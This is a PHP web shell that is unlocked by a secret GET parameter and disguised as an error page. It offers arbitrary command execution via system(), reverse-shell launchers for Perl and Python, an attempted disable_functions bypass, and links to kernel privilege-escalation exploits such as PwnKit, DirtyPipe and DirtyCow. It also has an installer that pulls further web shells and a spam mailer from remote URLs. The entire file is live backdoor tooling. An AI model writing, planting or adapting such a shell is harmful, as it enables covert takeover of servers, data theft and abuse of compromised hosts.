<?php

  error_reporting(0);
  if(isset($_GET['waifu']) && $_GET['waifu'] === 'asuna') {
      $_SESSION["asuna"] = true;
  }

  if(isset($_SESSION["asuna"]) && $_SESSION["asuna"] === true){
    echo "
    <html>
      <head>
        <meta name='robots' content='noindex'/>
        <title>見つかりません</title>
      </head>
      <img src='https://i.giphy.com/tGSDPclbbiFCqvnbmG.webp' style='position: fixed; bottom: -50px; right: -50px;' width='350px' height='350px'/>
      <body>
    </html>";

$mynameyangsuperkeren="angga1337@localhost: ";
$lokalroot="<br>  LOCALROOT PKEXEC: ";
$linklokalroot="[<a style=text-decoration:none href='https://github.com/arthepsy/CVE-2021-4034'><font color=#0000FF>HERE</font></a>]";
$lokalroot1="<br>  LOCALROOT DIRTYPIPE: ";
$linklokalroot1="[<a style=text-decoration:none href='https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits'><font color=#0000FF>HERE</font></a>]";
$lokalroot2="<br>  LOCALROOT DIRTYCOW: ";
$linklokalroot2="[<a style=text-decoration:none href='https://github.com/firefart/dirtycow'><font color=#0000FF>HERE</font></a>]";
$lokalroot3="<br>  CVE-2024-1086 Kernel v5.14 and v6.6: ";
$linklokalroot3="[<a style=text-decoration:none href='https://github.com/Notselwyn/CVE-2024-1086'><font color=#0000FF>HERE</font></a>]";
$softwaretolol="<font color=#0000FF>Software: </font>";
$kwernel="<font color=#0000FF>Kernel: </font>";
$awalandirektori="<font color=#0000FF><br>Path: </font>";
$bypass_disable_function="Bypass disable_function: ";
$direktorijancok= getcwd();
$kontol="<font color=#0000FF>Uname: </font>";
$ikiipnecok="<font color=#0000FF>Server IP: </font>";
$memek="<font color=#0000FF>Disable Function: </font>";
$ikiosrilis="<font color=#0000FF>OS: </font>";
$sekiso="<font color=#0000FF><br>Useful: </font>";
$ikigcccok="GCC: ";
$ikicurlcok="  CURL: ";
$ikiwgetcok="  WGET: ";
$ikiperlcok="  PERL: ";
$ikipythoncok="  PYTHON: ";
$ikirubycok="  RUBY: ";
$ikipkexeccok="  PKEXEC: ";
$on="[<font color=#008000>ON</font>]";
$off="[<font color=#FF0000>OFF</font>]";

  echo $kontol . php_uname() . "<br>";
    $disfunc = @ini_get("disable_functions");
  if(empty($disfunc)){
    $anu = "<gr>NONE</gr>";
  } else {
    $anu = "<rd>$disfunc</rd>";
  }

  echo $memek . $anu . "<br>";

  $ipnecok = $_SERVER['SERVER_ADDR'];
  echo $ikiipnecok . $ipnecok . "<br>";
    $ngecekosrilisbangsat = shell_exec('grep PRETTY /etc/os-*elease');
  if(empty($ngecekosrilisbangsat)){
    $osrilisasu = "Not Readable or Not Found";
  } else {
    $osrilisasu = "$ngecekosrilisbangsat";
  }

  echo $ikiosrilis . $osrilisasu . "<br>";
  echo $softwaretolol . $_SERVER['SERVER_SOFTWARE'] . "<br>";
  echo $kwernel . shell_exec('uname -r') . "<br>";
  echo $sekiso;

  // Check GCC
  $outputgcc = shell_exec('gcc --version');
  if(empty($outputgcc)){
    $asu = $off;
  } else {
    $asu = $on;
  }
  echo $ikigcccok . $asu;

  // Check Curl
  $outputcurl = shell_exec('curl -V');
  if(empty($outputcurl)){
    $asu1 = $off;
  } else {
    $asu1 = $on;
  }
  echo $ikicurlcok . $asu1;

  // Check Wget
  $outputwget = shell_exec('wget -V');
  if(empty($outputwget)){
    $asu2 = $off;
  } else {
    $asu2 = $on;
  }
  echo $ikiwgetcok . $asu2;

  // Check Perl
  $outputperl = shell_exec('perl -v');
  if(empty($outputperl)){
    $asu3 = $off;
  } else {
    $asu3 = $on;
  }
  echo $ikiperlcok . $asu3;

  // Check Python
  $outputpython = shell_exec('python --version');
  if(empty($outputpython)){
    $asu4 = $off;
  } else {
    $asu4 = $on;
  }
  echo $ikipythoncok . $asu4;

  // Check Ruby
  $outputruby = shell_exec('ruby -v');
  if(empty($outputruby)){
    $asu5 = $off;
  } else {
    $asu5 = $on;
  }
  echo $ikirubycok . $asu5;

  // Check PKEEXEC
  $outputpkexec = shell_exec('ls -la /usr/bin/pkexec');
  if(empty($outputpkexec)){
    $asu6 = $off;
  } else {
    $asu6 = $on;
  }
  echo $ikipkexeccok . $asu6;

  // Localroot
  echo $lokalroot . $linklokalroot;
  echo $lokalroot1 . $linklokalroot1;
  echo $lokalroot2 . $linklokalroot2;
  echo $lokalroot3 . $linklokalroot3 . "<br>";

  // Function Bypass disable_function
  echo $bypass_disable_function . "
    <form method='POST'>
    <select name='disablefunction'>
      <option selected disabled>select</option>
      <option value='phpini'>php.ini</option>
      <option value='apache' disabled>.htaccess (apache)</option>
      <option value='litespeed' disabled>.htaccess (litespeed)</option>
    </select>
      <button type='submit'>bypass</button>
    </form>";

  function disablefunction($nameFile, $content) {
    $file = fopen($nameFile, "w");
    fwrite($file, $content);
    fclose($file);
    return true;
  }

  switch ($_POST['disablefunction']) {
    case ('phpini'):
    switch (true) {
      case (disablefunction('php.ini', 'safe_mode=OFF')):
      echo "Success create php.ini";
    }
    break;
    case ('apache'):
    switch (true) {
      case (disablefunction('php.ini', 'safe_mode=OFF')):
      $hasil = "Success create php.ini";
    }
    break;
    case ('phpini'):
    switch (true) {
      case (disablefunction('php.ini', 'safe_mode=OFF')):
      $hasil = "Success create php.ini";
    }
    break;
  }

  // End Bypass disable_function

  echo $awalandirektori . $direktorijancok;

  // function installer
  function op($d, $e) {
    $fp = fopen($d, "w");
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $e);
    curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_FILE, $fp);
    return curl_exec($ch);
    curl_close($ch);
    fclose($fp);
    ob_flush();
    flush();
  }

  // Command
  function exe($cmd) {
  if(function_exists('system')) {
    @ob_start();
    @system($cmd);
    $buff = @ob_get_contents();
    @ob_end_clean();
    return $buff;
  } elseif(function_exists('exec')) {
    @exec($cmd,$results);
    $buff = "";
  foreach($results as $result) {
    $buff .= $result;
    } return $buff;
  } elseif(function_exists('passthru')) {
    @ob_start();
    @passthru($cmd);
    $buff = @ob_get_contents();
    @ob_end_clean();
    return $buff;
  } elseif(function_exists('shell_exec')) {
    $buff = @shell_exec($cmd);
    return $buff;
    }
  }

  // BackConnect or Reverse Shell
  if($_POST['bc'] == 'perl'){
    $bc = base64_decode("");
    $plbc = @fopen('bc.pl','w');
    fwrite($plbc,$bc);
    $out = exe("perl bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &");
    sleep(1);
    echo "<pre>$out\n".exe("ps aux | grep bc.pl")."</pre>";
    unlink("bc.pl");
  }

  if($_POST['bc'] == 'python'){
    $bc_py = base64_decode("");
    $pbc_py = @fopen('bcpy.py','w');
    fwrite($pbc_py,$bc_py);
    $out_py = exe("python bcpy.py ".$_POST['server']." ".$_POST['port']);
    sleep(1);
    echo "<pre>$out_py\n".exe("ps aux | grep bcpy.py")."</pre>";
    unlink("bcpy.py");
  }

  if($_POST['anuanu']) {
    $cmdgoblok = $_POST['anuanu'];
  }

  // Installer Shell
  switch ($_POST['op']) {
    case ('alfa'):
    switch (true) {
      case (op('alfa.php', 'https://raw.githubusercontent.com/nicxlau/alfa-shell/master/alfa-deobfuscated.php')):
      $hasil = '<b><a href="./alfa.php" target="_blank">alfa.php</a> > </b>ok!';
    }
    break;

    case ('adminer'):
    switch (true) {
      case (op('adminer.php', 'https://raw.githubusercontent.com/lainonz/uploaderphp/main/adminer-4.8.1.php')):
      $hasil = '<b><a href="./adminer.php" target="_blank">adminer.php</a> > </b>ok!';
    }
    break;

    case ('priv8'):
    switch (true) {
      case (op('priv8shell.php', 'https://raw.githubusercontent.com/lainonz/uploaderphp/main/privmaul.php')):
      $hasil = '<b><a href="./priv8shell.php" target="_blank">priv8shell.php</a> > </b>ok!';
    }
    break;

    case ('marijuana'):
    switch (true) {
      case (op('marijuana.php', 'https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php')):
      $hasil = '<b><a href="./marijuana.php" target="_blank">marijuana.php</a> > </b>ok!';
    }
    break;
    case ('mailer'):
    switch (true) {
      case (op('leafmailer.php', 'https://raw.githubusercontent.com/lainonz/uploaderphp/main/mail.php')):
      $hasil = '<b><a href="./leafmailer.php" target="_blank">leafmailer.php</a> > </b>ok!';
    }
    break;
  }

  // Html
  echo "
    <form method='POST'>
    <select name='op'>
      <option selected disabled>select</option>
      <option value='alfa'>Alfa Shell</option>
      <option value='adminer'>Adminer</option>
      <option value='priv8'>Priv8</option>
      <option value='marijuana'>Marijuana</option>
      <option value='mailer'>Leaf Mailer</option>
    </select>
      <button type='submit'>Install</button>
    </form>
    <pre>$hasil</pre>
      <form method='POST'>
        <div class='input-group mb-3'>
          <i>$mynameyangsuperkeren</i><input class='form-control btn-sm' type='text' name='anuanu' value='$cmdgoblok' placeholder='uname -a'>
          <input type='submit' value='Execute'>
          <i>Server : </i><input type='text' name='server' placeholder='127.0.0.1'>
          <i>Port : </i><input type='text' name='port' placeholder='1337'>
          <select name='bc'>
          <option value='perl'>Perl</option>
          <option value='python'>Python</option>
          </select>
          <input type='submit' value='Connect'><br>
          <div style='border: 1px #000000 solid; padding: 10px;background-color:#FFFFFF; text-align: left;height:100%; margin-top:10px; overflow: scroll;'>
          <pre>~$&nbsp;$cmdgoblok<br>"; system($_POST['anuanu'].' 2>&1'); echo "</pre>
        </div>
      </div>
    </form>
  <br>";
  } else {
      http_response_code(500);
  }
?>
